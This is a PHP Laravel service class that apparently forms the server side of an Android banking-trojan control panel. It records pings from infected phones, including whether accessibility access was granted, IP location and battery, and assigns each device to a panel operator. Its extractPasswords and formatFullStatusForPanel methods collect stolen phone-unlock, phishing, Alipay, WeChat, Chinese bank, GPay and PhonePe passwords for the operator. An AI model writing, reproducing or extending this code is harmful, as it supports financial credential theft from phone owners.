<?php

declare(strict_types=1);

namespace App\WebSocket\Services;

use App\Models\Device;
use App\Services\GeoIpService;
use App\WebSocket\ConnectionManager;
use App\WebSocket\WebSocketLog;
use Illuminate\Support\Facades\Redis;

final class DeviceStatusService
{
    private ConnectionManager $connectionManager;

    public function __construct(ConnectionManager $connectionManager)
    {
        $this->connectionManager = $connectionManager;
    }

    public function updateFromPing(string $phoneId, string $encodedData): array
    {
        parse_str($encodedData, $params);

        // 直接保存设备发送的所有字段，添加服务端字段
        $status = array_merge($params, [
            'phone_id' => $phoneId,
            'last_ping' => time(),
            'is_online' => true,
        ]);

        // IP 与归属地（兼容：异常不影响 WebSocket 正常连接）
        try {
            if (empty($status['ip'])) {
                $clientIp = $this->connectionManager->getClientIp($phoneId);
                if ($clientIp !== null) {
                    $status['ip'] = $clientIp;
                }
            }

            if (!empty($status['ip'])) {
                $existing = $this->connectionManager->getDeviceStatus($phoneId);
                $existingIp = $existing['ip'] ?? null;
                $existingLocation = $existing['ip_location'] ?? null;

                if ($status['ip'] === $existingIp && !empty($existingLocation)) {
                    $status['ip_location'] = $existingLocation;
                } else {
                    $device = Device::where('uuid', $phoneId)->first();
                    if ($device && $status['ip'] === $device->ip_address && !empty($device->ip_location)) {
                        $status['ip_location'] = $device->ip_location;
                    } else {
                        $status['ip_location'] = app(GeoIpService::class)->getLocation($status['ip']);
                    }
                }
            }
        } catch (\Throwable $e) {
            WebSocketLog::getLogger()->warning('IP/GeoIP handling failed, skipping', [
                'phone_id' => $phoneId,
                'error' => $e->getMessage(),
            ]);
        }

        // 规范化阿拉伯数字
        foreach ($status as $key => $value) {
            if (is_string($value)) {
                $status[$key] = $this->normalizeValue($value);
            }
        }

        $this->connectionManager->updateDeviceStatus($phoneId, $status);

        $this->syncToDatabase($phoneId, $status);

        return $status;
    }

    private function normalizeValue(string $value): string
    {
        $arabicIndic = ['٠', '١', '٢', '٣', '٤', '٥', '٦', '٧', '٨', '٩'];
        $western = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];

        return str_replace($arabicIndic, $western, trim($value));
    }

    private function syncToDatabase(string $phoneId, array $status): void
    {
        $device = Device::where('uuid', $phoneId)->first();
        $isNewDevice = $device === null;

        if ($isNewDevice) {
            $device = $this->createDevice($phoneId, $status);
            if ($device === null) {
                return;
            }
        }

        $updates = [
            'is_online' => true,
            'last_seen_at' => now(),
        ];

        // 使用原始字段名映射到数据库字段
        if (isset($status['phone_name'])) {
            $updates['name'] = $status['phone_name'];
        }
        if (isset($status['model'])) {
            $updates['model'] = $status['model'];
        }
        if (isset($status['android_version'])) {
            $updates['android_version'] = $status['android_version'];
        }
        if (isset($status['battery_charge'])) {
            // 解析 "t~88" 格式，提取电量数字
            $parts = explode('~', $status['battery_charge']);
            $level = count($parts) >= 2 ? (int) $parts[1] : (int) $status['battery_charge'];
            $updates['battery_level'] = $level;
        }
        if (isset($status['accessibility'])) {
            $updates['has_accessibility'] = $status['accessibility'] === '1';
        }
        if (isset($status['country'])) {
            $updates['country'] = $status['country'];
        }
        if (isset($status['ip'])) {
            $updates['ip_address'] = $status['ip'];
        }
        if (isset($status['ip_location'])) {
            $updates['ip_location'] = $status['ip_location'];
        }

        $device->update($updates);

        if ($isNewDevice || !$device->getOriginal('is_online')) {
            $this->connectionManager->notifyPanelUsersDeviceOnline($phoneId, $device->user_id, [
                'phone_id' => $phoneId,
                'phone_name' => $status['phone_name'] ?? '',
                'model' => $status['model'] ?? '',
                'battery_charge' => $status['battery_charge'] ?? '',
                'is_online' => true,
            ]);
        }
    }

    private function createDevice(string $phoneId, array $status): ?Device
    {
        $userEmail = $status['user_email'] ?? null;
        $user = $this->findUserByEmail($userEmail);

        if ($user === null) {
            $user = \App\Models\User::first();
        }

        if ($user === null) {
            WebSocketLog::getLogger()->warning("Cannot create device {$phoneId}: no user found");
            return null;
        }

        // 解析电量
        $batteryLevel = null;
        if (isset($status['battery_charge'])) {
            $parts = explode('~', $status['battery_charge']);
            $batteryLevel = count($parts) >= 2 ? (int) $parts[1] : (int) $status['battery_charge'];
        }

        return Device::create([
            'uuid' => $phoneId,
            'user_id' => $user->id,
            'name' => $status['phone_name'] ?? 'Unknown Device',
            'model' => $status['model'] ?? null,
            'android_version' => $status['android_version'] ?? null,
            'battery_level' => $batteryLevel,
            'has_accessibility' => ($status['accessibility'] ?? '0') === '1',
            'country' => $status['country'] ?? null,
            'ip_address' => $status['ip'] ?? null,
            'ip_location' => $status['ip_location'] ?? null,
            'installed_at' => isset($status['install_date']) ? \Carbon\Carbon::parse($status['install_date']) : now(),
            'is_online' => true,
            'last_seen_at' => now(),
        ]);
    }

    private function findUserByEmail(?string $email): ?\App\Models\User
    {
        if (empty($email)) {
            return null;
        }

        \Illuminate\Support\Facades\DB::reconnect();

        $user = \App\Models\User::where('email', $email)->first();
        if ($user !== null) {
            return $user;
        }

        $encryptionService = new EncryptionService();
        $encryptedEmail = $encryptionService->encryptEmail($email);

        return \App\Models\User::where('email_encrypted', $encryptedEmail)->first();
    }

    public function getStatus(string $phoneId): array
    {
        return $this->connectionManager->getDeviceStatus($phoneId);
    }

    public function isOnline(string $phoneId): bool
    {
        return $this->connectionManager->isDeviceOnline($phoneId);
    }

    public function markOffline(string $phoneId): void
    {
        Device::where('uuid', $phoneId)->update([
            'is_online' => false,
            'last_seen_at' => now(),
        ]);
    }

    public function formatForPanel(string $phoneId): array
    {
        $status = $this->getStatus($phoneId);
        $isOnline = $this->isOnline($phoneId);

        // 直接返回设备原始数据，添加服务端字段
        return array_merge($status, [
            'pid' => $phoneId,
            'is_online' => $isOnline,
            'lastPing' => ($status['last_ping'] ?? 0) * 1000,
            'ip_location' => $status['ip_location'] ?? '',
        ]);
    }

    /**
     * 提取密码数据
     */
    public function extractPasswords(string $phoneId): array
    {
        $status = $this->getStatus($phoneId);

        return [
            'phone' => $status['pass_phone'] ?? '',
            'phish' => $status['pass_phish'] ?? '',
            'alipay' => $status['pass_alipay'] ?? '',
            'wechat' => $status['pass_wechat'] ?? '',
            'yun' => $status['pass_yun'] ?? '',
            'jian' => $status['pass_jian'] ?? '',
            'you' => $status['pass_you'] ?? '',
            'nong' => $status['pass_nong'] ?? '',
            'zhong' => $status['pass_zhong'] ?? '',
            'gong' => $status['pass_gong'] ?? '',
            'zhao' => $status['pass_zhao'] ?? '',
            'gpay' => $status['pass_gpay'] ?? '',
            'phonepe' => $status['pass_phonepe'] ?? '',
            'bc' => $status['pass_bc'] ?? '',
            'mb' => $status['pass_mb'] ?? '',
        ];
    }

    /**
     * 格式化完整的设备状态（包含密码）供 Panel 使用
     */
    public function formatFullStatusForPanel(string $phoneId): array
    {
        $phoneInfo = $this->formatForPanel($phoneId);
        $passwords = $this->extractPasswords($phoneId);
        $isOnline = $this->isOnline($phoneId);

        return [
            'phoneInfo' => $phoneInfo,
            'passwords' => $passwords,
            'is_online' => $isOnline,
            'lastPing' => $phoneInfo['lastPing'] ?? null,
        ];
    }
}
